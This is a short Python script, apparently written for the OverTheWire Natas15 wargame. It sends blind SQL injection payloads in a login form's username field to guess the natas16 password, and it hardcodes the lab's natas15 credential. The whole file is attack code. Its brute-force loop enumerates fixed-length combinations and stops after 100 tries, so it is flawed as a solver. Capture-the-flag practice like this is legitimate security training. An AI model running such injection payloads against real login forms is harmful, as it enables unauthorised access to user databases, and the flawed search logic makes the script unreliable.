import requests
import itertools

url = "http://natas15.natas.labs.overthewire.org"
user = "natas15"
password = "AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J"
prefix = "natas16\" and password like \"%"
postfix = "\"; -- "
possible_values = 'AaBbCcDdEeFfGgHhIiJjKkLlMmNnOoPpQqRrSsTtUuVvWwXxYyZz0123456789'
all_possible_values = itertools.combinations_with_replacement(possible_values, 32)
i = 0
max_try = 100
for value in all_possible_values:
    i = i + 1
    trial_password = "".join(value)
    content = prefix + trial_password + postfix
    resp = requests.post(url, data={"username": content}, auth=(user, password))
    if 'This user doesn\'t exist.' in resp.content:
        print(trial_password + ' is not correct')
    elif 'Error in query.' in resp.content:
        print(trial_password + ' lead to error')
    else:
        print(trial_password + ' is correct !!!!!!!!!!!!!!!!!')
    if (i > max_try):
        break
